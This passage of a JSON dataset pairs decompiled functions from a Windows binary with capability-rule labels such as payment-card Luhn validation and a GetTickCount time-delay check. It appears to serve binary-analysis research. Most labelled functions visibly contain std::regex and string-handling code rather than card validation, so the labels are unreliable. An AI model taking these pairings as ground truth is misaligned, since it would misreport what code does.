        "decompiled_code": "\nvoid fcn.180028e90(int64_t arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    int64_t arg3;\n    uchar auStack56 [32];\n    int32_t iStack24;\n    int32_t iStack20;\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack56;\n    iStack20 = 0;\n    iStack24 = 0;\n    (**0x1800de7f0)(arg2, 0xb0, &iStack20, &iStack24);\n    iVar1 = (**0x1800de6f8)();\n    if (iVar1 == iStack24 - iStack20) {\n        if (arg2 == *(arg1 + 0x30)) {\n            iVar1 = *(arg1 + 0x68);\n        }\n        else {\n            iVar1 = *(arg1 + 0x6c);\n        }\n        (**0x1800de7f0)(arg2, 0xb1, iVar1, iVar1);\n        (**0x1800de7f0)(arg2, 0xb7, 0, 0);\n    }\n    arg3 = *(arg1 + 0x30);\n    if (arg2 == arg3) {\n        arg3 = *(arg1 + 0x38);\n    }\n    fcn.180028f50(arg1, arg2, arg3);\n    fcn.18008fb00(uStack16 ^ auStack56);\n    return;\n}\n",
        "token_count": 336
    },
    "18002adb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint32_t fcn.18002adb0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t arg1_00;\n    int64_t iVar4;\n    int64_t arg2;\n    int64_t iVar5;\n    \n    iVar1 = (**0x1800de7f0)(*(arg1 + 0x70), 0x188, 0, 0);\n    if (iVar1 != -1) {\n        iVar2 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n        if (iVar2 != -1) {\n            iVar5 = iVar1 * 0xf0 + *(arg1 + 0xd8);\n            iVar4 = *(iVar5 + 0x70);\n            arg2 = iVar2 * 0xa0 + 0xa0 + *(iVar5 + 0x68);\n            if (arg2 != iVar4) {\n                arg1_00 = arg2 + -0x60;\n                do {\n                    fcn.18000d960(arg1_00 + -0x40, arg2);\n                    fcn.18000d960(arg1_00 + -0x20, arg1_00 + 0x80);\n                    fcn.18000d960(arg1_00, arg1_00 + 0xa0);\n                    fcn.18000d960(arg1_00 + 0x20, arg1_00 + 0xc0);\n                    fcn.18000d960(arg1_00 + 0x40, arg1_00 + 0xe0);\n                    arg2 = arg2 + 0xa0;\n                    arg1_00 = arg1_00 + 0xa0;\n                } while (arg2 != iVar4);\n                iVar4 = *(iVar5 + 0x70);\n            }\n            fcn.1800252e0(iVar4 + -0xa0);\n            *(iVar5 + 0x70) = *(iVar5 + 0x70) + -0xa0;\n            iVar1 = (*(iVar5 + 0x70) - *(iVar5 + 0x68)) / 0xa0;\n            iVar3 = iVar1 + -1;\n            if (iVar2 <= iVar1 + -2) {\n                iVar3 = iVar2;\n            }\n            (**0x1800de7f0)(*(arg1 + 0xb8), 0x182, iVar2, 0);\n            (**0x1800de7f0)(*(arg1 + 0xb8), 0x186, iVar3, 0);\n            *(arg1 + 0x61) = 0;\n            *(arg1 + 99) = 1;\n            fcn.180028210(arg1);\n            return iVar3;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 644
    },
    "18002c10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.18002c100(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uchar auStack24 [16];\n    \n    uVar2 = (**0x1800de7f0)(*(arg1 + 0x70), 0x188, 0, 0);\n    uVar1 = uVar2;\n    if (uVar1 == 0xffffffff) {\n        return uVar2;\n    }\n    fcn.18002d860(arg1 + 0xd8, auStack24, uVar1 * 0xf0 + *(arg1 + 0xd8));\n    iVar3 = *(arg1 + 0xe0) - *(arg1 + 0xd8);\n    iVar3 = iVar3 + SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar3) >> 0x40, 0);\n    iVar4 = (iVar3 >> 7) - (iVar3 >> 0x3f);\n    uVar5 = iVar4 - 1;\n    if (uVar1 <= iVar4 + -2) {\n        uVar5 = uVar1;\n    }\n    (**0x1800de7f0)(*(arg1 + 0x70), 0x182, uVar1, 0);\n    (**0x1800de7f0)(*(arg1 + 0x70), 0x186, uVar5, 0);\n    *(arg1 + 0x61) = 0x100;\n    fcn.1800277d0(arg1);\n    return uVar5;\n}\n",
        "token_count": 386
    },
    "18002e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.18002e100(ulong *arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    char in_R8B;\n    \n    iVar1 = arg1[2];\n    if (arg2 <= arg1[3] - iVar1) {\n        arg1[2] = iVar1 + arg2;\n        puVar2 = arg1;\n        if (0xf < arg1[3]) {\n            puVar2 = *arg1;\n        }\n        fcn.1800ae290(puVar2 + iVar1, in_R8B, arg2);\n        *(puVar2 + iVar1 + arg2) = 0;\n        return arg1;\n    }\n    puVar2 = fcn.18002f2f0(arg1, arg2, 0, arg2);\n    return puVar2;\n}\n",
        "token_count": 194
    },
    "18002e49": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint * fcn.18002e490(uint *arg1, ulong *arg2, ulong *arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t arg4;\n    uint64_t arg2_00;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    ulong *puVar6;\n    \n    uVar1 = arg2[3];\n    arg4 = arg2[2];\n    arg2_00 = arg3[2];\n    if ((uVar1 - arg4 < arg2_00) && (arg4 <= arg3[3] - arg2_00)) {\n        if (7 < uVar1) {\n            arg2 = *arg2;\n        }\n        puVar5 = fcn.180014b80(arg3, arg2_00, arg2, arg4);\n        *(arg1 + 4) = 0;\n        *(arg1 + 6) = 0;\n        uVar2 = puVar5[1];\n        uVar3 = puVar5[2];\n        uVar4 = puVar5[3];\n        *arg1 = *puVar5;\n        arg1[1] = uVar2;\n        arg1[2] = uVar3;\n        arg1[3] = uVar4;\n        uVar2 = puVar5[5];\n        uVar3 = puVar5[6];\n        uVar4 = puVar5[7];\n        arg1[4] = puVar5[4];\n        arg1[5] = uVar2;\n        arg1[6] = uVar3;\n        arg1[7] = uVar4;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 6) = 7;\n        *puVar5 = 0;\n        return arg1;\n    }\n    if (7 < arg3[3]) {\n        arg3 = *arg3;\n    }\n    if (uVar1 - arg4 < arg2_00) {\n        arg2 = fcn.180013690(arg2, arg2_00, 0, arg3);\n    }\n    else {\n        arg2[2] = arg2_00 + arg4;\n        puVar6 = arg2;\n        if (7 < uVar1) {\n            puVar6 = *arg2;\n        }\n        fcn.1800ade80(puVar6 + arg4 * 2, arg3, arg2_00 * 2);\n        *(puVar6 + (arg2_00 + arg4) * 2) = 0;\n    }\n    *(arg1 + 4) = 0;\n    *(arg1 + 6) = 0;\n    uVar2 = *(arg2 + 4);\n    uVar3 = *(arg2 + 1);\n    uVar4 = *(arg2 + 0xc);\n    *arg1 = *arg2;\n    arg1[1] = uVar2;\n    arg1[2] = uVar3;\n    arg1[3] = uVar4;\n    uVar2 = *(arg2 + 0x14);\n    uVar3 = *(arg2 + 3);\n    uVar4 = *(arg2 + 0x1c);\n    arg1[4] = *(arg2 + 2);\n    arg1[5] = uVar2;\n    arg1[6] = uVar3;\n    arg1[7] = uVar4;\n    arg2[2] = 0;\n    *arg2 = 0;\n    arg2[3] = 7;\n    return arg1;\n}\n",
        "token_count": 802
    },
    "18002e71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint * fcn.18002e710(uint *arg1, ulong *arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint64_t arg2_00;\n    ulong *puVar5;\n    \n    arg2_00 = 0xffffffffffffffff;\n    do {\n        arg2_00 = arg2_00 + 1;\n    } while (*(arg3 + arg2_00 * 2) != 0);\n    iVar1 = arg2[2];\n    if (arg2[3] - iVar1 < arg2_00) {\n        arg2 = fcn.180013690(arg2, arg2_00, 0, arg3);\n    }\n    else {\n        arg2[2] = iVar1 + arg2_00;\n        puVar5 = arg2;\n        if (7 < arg2[3]) {\n            puVar5 = *arg2;\n        }\n        fcn.1800ade80(puVar5 + iVar1 * 2, arg3, arg2_00 * 2);\n        *(puVar5 + (iVar1 + arg2_00) * 2) = 0;\n    }\n    *(arg1 + 4) = 0;\n    *(arg1 + 6) = 0;\n    uVar2 = *(arg2 + 4);\n    uVar3 = *(arg2 + 1);\n    uVar4 = *(arg2 + 0xc);\n    *arg1 = *arg2;\n    arg1[1] = uVar2;\n    arg1[2] = uVar3;\n    arg1[3] = uVar4;\n    uVar2 = *(arg2 + 0x14);\n    uVar3 = *(arg2 + 3);\n    uVar4 = *(arg2 + 0x1c);\n    arg1[4] = *(arg2 + 2);\n    arg1[5] = uVar2;\n    arg1[6] = uVar3;\n    arg1[7] = uVar4;\n    arg2[2] = 0;\n    arg2[3] = 7;\n    *arg2 = 0;\n    return arg1;\n}\n",
        "token_count": 497
    },
    "18003032": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180030320(char **arg1)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    bool bVar6;\n    int64_t iVar7;\n    char cVar8;\n    ulong uVar9;\n    uchar (*pauVar10) [16];\n    char *pcVar11;\n    uchar (*pauVar12) [16];\n    \n    pcVar3 = arg1[9];\n    cVar8 = fcn.180030850(arg1);\n    if (cVar8 == '\\0') {\n        if (*(arg1 + 0x7c) != 0x7c) {\n            return;\n        }\n        uVar9 = fcn.180015eb0(arg1 + 8, 8);\n        fcn.180015670(arg1 + 8, uVar9);\n    }\n    pauVar10 = fcn.18008fb2c(0x20);\n    *pauVar10 = ZEXT816(0);\n    pauVar10[1] = ZEXT816(0);\n    *(pauVar10[1] + 8) = 0;\n    *(*pauVar10 + 8) = 0x11;\n    *pauVar10[1] = 0;\n    **pauVar10 = vtable.std::_Node_endif.0;\n    *(pauVar10[1] + 8) = arg1[9];\n    pcVar11 = arg1[9];\n    if (*(pcVar11 + 0x10) != 0) {\n        *pauVar10[1] = *(pcVar11 + 0x10);\n        *(*(arg1[9] + 0x10) + 0x18) = pauVar10;\n        pcVar11 = arg1[9];\n    }\n    *(pcVar11 + 0x10) = pauVar10;\n    arg1[9] = pauVar10;\n    pauVar12 = fcn.18008fb2c(0x30);\n    *pauVar12 = ZEXT816(0);\n    pauVar12[1] = ZEXT816(0);\n    pauVar12[2] = ZEXT816(0);\n    *(*pauVar12 + 8) = 0x10;\n    *pauVar12[1] = 0;\n    *(pauVar12[1] + 8) = 0;\n    **pauVar12 = vtable.std::_Node_if.0;\n    *pauVar12[2] = pauVar10;\n    *(pauVar12[2] + 8) = 0;\n    iVar4 = *(pcVar3 + 0x10);\n    *(*(iVar4 + 0x18) + 0x10) = pauVar12;\n    *(pauVar12[1] + 8) = *(iVar4 + 0x18);\n    *(iVar4 + 0x18) = pauVar12;\n    *pauVar12[1] = iVar4;\n    iVar2 = *(arg1 + 0x7c);\n    while (iVar2 == 0x7c) {\n        pcVar11 = *arg1;\n        if (pcVar11 != arg1[2]) {\n            if (*pcVar11 == '\\\\') {\n                pcVar1 = pcVar11 + 1;\n                if ((pcVar1 == arg1[2]) ||\n                   ((((*(arg1 + 0x10) & 8) != 0 || (1 < *pcVar1 - 0x28U)) &&\n                    (((*(arg1 + 0x10) & 0x10) != 0 || ((*pcVar1 + 0x85U & 0xfd) != 0)))))) {\n                    bVar6 = false;\n                }\n                else {\n                    bVar6 = true;\n                }\n                if (bVar6) {\n                    pcVar11 = pcVar1;\n                }\n            }\n            *arg1 = pcVar11 + 1;\n        }\n        fcn.180030080(arg1);\n        cVar8 = fcn.180030850(arg1);\n        if (cVar8 == '\\0') {\n            uVar9 = fcn.180015eb0(arg1 + 8, 8);\n            fcn.180015670(arg1 + 8, uVar9);\n        }\n        iVar4 = *(pcVar3 + 0x10);\n        iVar5 = *pauVar10[1];\n        *pauVar10[1] = 0;\n        pcVar11 = arg1[9];\n        arg1[9] = pauVar10;\n        *pauVar10[1] = 0;\n        *(pcVar11 + 0x10) = pauVar10;\n        for (iVar7 = *(iVar4 + 0x28); iVar7 != 0; iVar7 = *(iVar7 + 0x28)) {\n            iVar4 = iVar7;\n        }\n        pauVar12 = fcn.18008fb2c(0x30);\n        *pauVar12 = ZEXT816(0);\n        pauVar12[1] = ZEXT816(0);\n        pauVar12[2] = ZEXT816(0);\n        *(*pauVar12 + 8) = 0x10;\n        *(pauVar12[1] + 8) = 0;\n        **pauVar12 = vtable.std::_Node_if.0;\n        *pauVar12[2] = pauVar10;\n        *(pauVar12[2] + 8) = 0;\n        *(iVar4 + 0x28) = pauVar12;\n        *pauVar12[1] = iVar5;\n        *(iVar5 + 0x18) = *(iVar4 + 0x28);\n        iVar2 = *(arg1 + 0x7c);\n    }\n    return;\n}\n",
        "token_count": 1311
    },
    "180030fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180030fa0(uint64_t arg1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    char cVar3;\n    uchar uVar4;\n    uint32_t uVar5;\n    uchar (*pauVar6) [16];\n    int64_t iVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    \n    if (((*(arg1 + 0x80) & 0x100) == 0) || (uVar9 = arg1,  cVar3 = fcn.180032560(arg1),  cVar3 == '\\0')) {\n        uVar9 = arg1;\n        cVar3 = fcn.1800329a0(arg1);\n        if (cVar3 != '\\0') {\n            uVar4 = *(arg1 + 0x74);\n            if ((*(*(arg1 + 0x48) + 8) != 6) || ((*(*(arg1 + 0x48) + 0xc) & 4) != 0)) {\n                pauVar6 = fcn.18008fb2c(0x30);\n                *pauVar6 = ZEXT816(0);\n                pauVar6[1] = ZEXT816(0);\n                pauVar6[2] = ZEXT816(0);\n                *(*pauVar6 + 8) = 6;\n                *pauVar6[1] = 0;\n                *(pauVar6[1] + 8) = 0;\n                **pauVar6 = vtable.std::_Node_str_char_.0;\n                *pauVar6[2] = 0;\n                *(pauVar6[2] + 8) = 0;\n                *(pauVar6[1] + 8) = *(arg1 + 0x48);\n                iVar7 = *(arg1 + 0x48);\n                if (*(iVar7 + 0x10) != 0) {\n                    *pauVar6[1] = *(iVar7 + 0x10);\n                    *(*(*(arg1 + 0x48) + 0x10) + 0x18) = pauVar6;\n                    iVar7 = *(arg1 + 0x48);\n                }\n                *(iVar7 + 0x10) = pauVar6;\n                *(arg1 + 0x48) = pauVar6;\n            }\n            if ((*(arg1 + 0x50) >> 8 & 1) == 0) {\n                if ((*(arg1 + 0x50) >> 0xb & 1) != 0) {\n                    uVar4 = fcn.1800323a0(*(arg1 + 0x58));\n                }\n            }\n            else {\n                uVar4 = (**(**(*(arg1 + 0x58) + 8) + 0x20))();\n            }\n            iVar7 = *(arg1 + 0x48);\n            uVar5 = *(iVar7 + 0x24);\n            if (*(iVar7 + 0x20) < uVar5 || *(iVar7 + 0x20) == uVar5) {\n                uVar1 = uVar5 + 0x10;\n                iVar8 = fcn.1800b15d0(*(iVar7 + 0x28), uVar1);\n                if (iVar8 == 0) {\n                    fcn.18006df20();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                *(iVar7 + 0x28) = iVar8;\n                uVar5 = *(iVar7 + 0x24);\n                *(iVar7 + 0x20) = uVar1;\n            }\n            *(uVar5 + *(iVar7 + 0x28)) = uVar4;\n            *(iVar7 + 0x24) = *(iVar7 + 0x24) + 1;\n            return;\n        }\n        if (((*(arg1 + 0x80) & 0x20000) == 0) || (cVar3 = fcn.180032610(arg1),  uVar9 = arg1,  cVar3 == '\\0')) {\n            fcn.180015140(uVar9, 2);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n    }\n    else {\n        uVar5 = *(arg1 + 0x74);\n        uVar10 = uVar5;\n        if (uVar5 != 0) {\n            if (((((*(arg1 + 0x80) >> 9 & 1) == 0) || (uVar5 < 10)) && (uVar9 = uVar10,  uVar10 <= *(arg1 + 0x18))) &&\n               ((uVar10 <= *(arg1 + 0x38) && *(arg1 + 0x38) != uVar10 &&\n                (uVar9 = uVar5 & 0x1f,  (*(*(arg1 + 0x20) + (uVar10 >> 5) * 4) & 1 << (uVar5 & 0x1f)) != 0)))) {\n                pauVar6 = fcn.18008fb2c(0x28);\n                *pauVar6 = ZEXT816(0);\n                pauVar6[1] = ZEXT816(0);\n                *pauVar6[2] = 0;\n                *(pauVar6[1] + 8) = 0;\n                *pauVar6[1] = 0;\n                **pauVar6 = vtable.std::_Node_back.0;\n                *(*pauVar6 + 8) = 0xf;\n                *pauVar6[2] = uVar5;\n                *(pauVar6[1] + 8) = *(arg1 + 0x48);\n                iVar7 = *(arg1 + 0x48);\n                if (*(iVar7 + 0x10) != 0) {\n                    *pauVar6[1] = *(iVar7 + 0x10);\n                    *(*(*(arg1 + 0x48) + 0x10) + 0x18) = pauVar6;\n                    iVar7 = *(arg1 + 0x48);\n                }\n                *(iVar7 + 0x10) = pauVar6;\n                *(arg1 + 0x48) = pauVar6;\n                return;\n            }\n            fcn.180015140(uVar9, 3);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        if ((*(arg1 + 0x80) >> 0x14 & 1) == 0) {\n            fcn.180015140(uVar9, 2);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.1800315f0(arg1 + 0x40);\n    }\n    return;\n}\n",
        "token_count": 1554
    },
    "18003112": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.180031120(char **arg1)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    bool bVar5;\n    ulong uVar6;\n    uchar (*arg2) [16];\n    char *pcVar7;\n    char **noname_0;\n    uint64_t uVar8;\n    \n    *(arg1 + 0x1c) = *(arg1 + 0x1c) + 1;\n    uVar2 = *(arg1 + 0x10);\n    if (((uVar2 >> 0x1b & 1) == 0) && (*(arg1 + 0x7c) == 0x29)) {\n        fcn.180015140(arg1, 5);\n        pcVar4 = swi(3);\n        uVar6 = (*pcVar4)();\n        return uVar6;\n    }\n    if (((uVar2 & 0x20) == 0) || (*(arg1 + 0x7c) != 0x3f)) {\n        if ((*(arg1 + 0xe) & 0x200) == 0) {\n            iVar3 = *(arg1 + 3);\n            *(arg1 + 3) = iVar3 + 1;\n            arg2 = fcn.18008fb2c(0x28);\n            *arg2 = ZEXT816(0);\n            arg2[1] = ZEXT816(0);\n            *arg2[2] = 0;\n            *(arg2[1] + 8) = 0;\n            *arg2[1] = 0;\n            **arg2 = vtable.std::_Node_capture.0;\n            *(*arg2 + 8) = 0xd;\n            *arg2[2] = iVar3 + 1;\n            *(arg2[1] + 8) = arg1[9];\n            pcVar7 = arg1[9];\n            if (*(pcVar7 + 0x10) != 0) {\n                *arg2[1] = *(pcVar7 + 0x10);\n                *(*(arg1[9] + 0x10) + 0x18) = arg2;\n                pcVar7 = arg1[9];\n            }\n            *(pcVar7 + 0x10) = arg2;\n            arg1[9] = arg2;\n            fcn.180030320(arg1);\n            fcn.180015670(arg1 + 8, arg2);\n            uVar8 = *(arg1 + 3) + 1;\n            if (*(arg1 + 3) == -1) {\n                uVar8 = 0xffffffffffffffff;\n            }\n            fcn.180017980(arg1 + 4, uVar8);\n            uVar8 = *arg2[2] >> 5;\n            *(arg1[4] + uVar8 * 4) = *(arg1[4] + uVar8 * 4) | 1 << (*arg2[2] & 0x1f);\n            goto code_r0x00018003136c;\n        }\n    }\n    else {\n        pcVar7 = *arg1;\n        if (pcVar7 != arg1[2]) {\n            if (*pcVar7 == '\\\\') {\n                pcVar1 = pcVar7 + 1;\n                if ((pcVar1 == arg1[2]) ||\n                   ((((uVar2 & 8) != 0 || (1 < *pcVar1 - 0x28U)) &&\n                    (((uVar2 & 0x10) != 0 || ((*pcVar1 + 0x85U & 0xfd) != 0)))))) {\n                    bVar5 = false;\n                }\n                else {\n                    bVar5 = true;\n                }\n                if (bVar5) {\n                    pcVar7 = pcVar1;\n                }\n            }\n            *arg1 = pcVar7 + 1;\n        }\n        fcn.180030080(arg1);\n        pcVar7 = *arg1;\n        iVar3 = *(arg1 + 0x7c);\n        if (pcVar7 != arg1[2]) {\n            if (*pcVar7 == '\\\\') {\n                pcVar1 = pcVar7 + 1;\n                if ((pcVar1 == arg1[2]) ||\n                   ((((*(arg1 + 0x10) & 8) != 0 || (1 < *pcVar1 - 0x28U)) &&\n                    (((*(arg1 + 0x10) & 0x10) != 0 || ((*pcVar1 + 0x85U & 0xfd) != 0)))))) {\n                    bVar5 = false;\n                }\n                else {\n                    bVar5 = true;\n                }\n                if (bVar5) {\n                    pcVar7 = pcVar1;\n                }\n            }\n            *arg1 = pcVar7 + 1;\n        }\n        noname_0 = arg1;\n        fcn.180030080(arg1);\n        if (iVar3 != 0x3a) {\n            if (iVar3 == 0x21) {\n                fcn.180032e50(arg1);\n                *(arg1 + 0x1c) = *(arg1 + 0x1c) + -1;\n                return 0;\n            }\n            if (iVar3 != 0x3d) {\n                fcn.180015140(noname_0, 0xe);\n                pcVar4 = swi(3);\n                uVar6 = (*pcVar4)();\n                return uVar6;\n            }\n            fcn.180032e50(arg1);\n            *(arg1 + 0x1c) = *(arg1 + 0x1c) + -1;\n            return 0;\n        }\n    }\n    uVar6 = fcn.180015eb0(arg1 + 8, 8);\n    fcn.180030320(arg1);\n    fcn.180015670(arg1 + 8, uVar6);\ncode_r0x00018003136c:\n    *(arg1 + 0x1c) = *(arg1 + 0x1c) + -1;\n    return 1;\n}\n",
        "token_count": 1369
    },
    "1800329a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.1800329a0(char **arg1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    ulong uVar7;\n    uint64_t noname_0;\n    char **ppcVar8;\n    char *pcVar9;\n    \n    if (*(arg1 + 0x7c) == -1) {\n        fcn.180015140(arg1, 2);\n        pcVar3 = swi(3);\n        uVar7 = (*pcVar3)();\n        return uVar7;\n    }\n    uVar4 = *(arg1 + 0x10);\n    ppcVar8 = arg1;\n    if ((uVar4 >> 0x10 & 1) == 0) {\ncode_r0x000180032a09:\n        if ((uVar4 >> 0xf & 1) == 0) {\ncode_r0x000180032a2f:\n            cVar2 = *(arg1 + 0xf);\n            if (cVar2 != 'c') {\n                if (cVar2 == 'x') {\n                    if ((uVar4 >> 0xc & 1) != 0) {\n                        pcVar9 = *arg1;\n                        if (pcVar9 != arg1[2]) {\n                            if (((*pcVar9 == '\\\\') && (pcVar1 = pcVar9 + 1,  pcVar1 != arg1[2])) &&\n                               ((((uVar4 & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                                (((uVar4 & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                                pcVar9 = pcVar1;\n                            }\n                            *arg1 = pcVar9 + 1;\n                        }\n                        fcn.180030080(arg1);\n                        uVar7 = 2;\ncode_r0x000180032b79:\n                        fcn.180033a20(arg1, uVar7);\n                        goto code_r0x000180032b81;\n                    }\n                }\n                else if ((cVar2 == 'u') && ((uVar4 >> 0xb & 1) != 0)) {\n                    pcVar9 = *arg1;\n                    if (pcVar9 != arg1[2]) {\n                        if (((*pcVar9 == '\\\\') && (pcVar1 = pcVar9 + 1,  pcVar1 != arg1[2])) &&\n                           ((((uVar4 & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                            (((uVar4 & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                            pcVar9 = pcVar1;\n                        }\n                        *arg1 = pcVar9 + 1;\n                    }\n                    fcn.180030080(arg1);\n                    uVar7 = 4;\n                    goto code_r0x000180032b79;\n                }\ncode_r0x000180032bf8:\n                if ((uVar4 >> 0xd & 1) != 0) {\n                    iVar5 = 3;\n                    *(arg1 + 0x74) = 0;\n                    do {\n                        cVar2 = *(arg1 + 0xf);\n                        ppcVar8 = cVar2;\n                        if (7 < cVar2 - 0x30U) break;\n                        uVar4 = cVar2 - 0x30;\n                        ppcVar8 = uVar4;\n                        if (uVar4 == 0xffffffff) break;\n                        iVar5 = iVar5 + -1;\n                        *(arg1 + 0x74) = uVar4 + *(arg1 + 0x74) * 8;\n                        pcVar9 = *arg1;\n                        if (pcVar9 != arg1[2]) {\n                            if (((*pcVar9 == '\\\\') && (pcVar1 = pcVar9 + 1,  pcVar1 != arg1[2])) &&\n                               ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                                (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                                pcVar9 = pcVar1;\n                            }\n                            *arg1 = pcVar9 + 1;\n                        }\n                        ppcVar8 = arg1;\n                        fcn.180030080(arg1);\n                    } while (iVar5 != 0);\n                    if (iVar5 != 3) {\n                        if (*(arg1 + 0x74) == 0) {\n                            fcn.180015140(ppcVar8, 2);\n                            pcVar3 = swi(3);\n                            uVar7 = (*pcVar3)();\n                            return uVar7;\n                        }\n                        goto code_r0x000180032b81;\n                    }\n                }\n                uVar4 = *(arg1 + 0x10);\n                iVar5 = *(arg1 + 0xf);\n                if ((uVar4 >> 0x16 & 1) == 0) {\n                    if (iVar5 - 0x22U < 0x5c) {\n    // switch table (92 cases) at 0x180032ddc\n                        switch(*(*((iVar5 - 0x22U) + 0x180032dec) * 4 + 0x180032ddc) + 0x180000000) {\n                        case 0x180032d02:\n                            uVar6 = uVar4 >> 0x17;\n                            break;\n                        case 0x180032d0a:\n                            uVar6 = uVar4 >> 0x18;\n                            break;\n                        case 0x180032d14:\n                            goto code_r0x000180032d14;\n                        case 0x180032d6a:\n                            goto code_r0x000180032d6a;\n                        }\n                        if ((uVar6 & 1) != 0) goto code_r0x000180032d14;\n                    }\ncode_r0x000180032d6a:\n                    return 0;\n                }\n                if (iVar5 - 0x44U < 0x34) {\n    // switch table (52 cases) at 0x180032da0\n                    switch(*(*((iVar5 - 0x44U) + 0x180032da8) * 4 + 0x180032da0) + 0x180000000) {\n                    case 0x180032d6a:\n                        goto code_r0x000180032d6a;\n                    }\n                }\ncode_r0x000180032d14:\n                pcVar9 = *arg1;\n                *(arg1 + 0x74) = iVar5;\n                if (pcVar9 != arg1[2]) {\n                    if (((*pcVar9 == '\\\\') && (pcVar1 = pcVar9 + 1,  pcVar1 != arg1[2])) &&\n                       ((((uVar4 & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                        (((uVar4 & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                        pcVar9 = pcVar1;\n                    }\n                    *arg1 = pcVar9 + 1;\n                }\n                fcn.180030080(arg1);\n                return 1;\n            }\n            if ((uVar4 >> 0x12 & 1) == 0) goto code_r0x000180032bf8;\n            pcVar9 = *arg1;\n            if (pcVar9 != arg1[2]) {\n                if (((*pcVar9 == '\\\\') && (pcVar1 = pcVar9 + 1,  pcVar1 != arg1[2])) &&\n                   ((((uVar4 & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                    (((uVar4 & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                    pcVar9 = pcVar1;\n                }\n                *arg1 = pcVar9 + 1;\n            }\n            fcn.180030080(arg1);\n            noname_0 = *(arg1 + 0xf) & 0xff;\n            if ((*(*(*(arg1[0xd] + 8) + 0x18) + noname_0 * 2) & 0x103) == 0) {\n                fcn.180015140(noname_0, 2);\n                pcVar3 = swi(3);\n                uVar7 = (*pcVar3)();\n                return uVar7;\n            }\n            uVar4 = *(arg1 + 0xf) & 0x8000001f;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xffffffe0) + 1;\n            }\n            iVar5 = uVar4;\n        }\n        else if (*(arg1 + 0xf) == 'a') {\n            iVar5 = 7;\n        }\n        else {\n           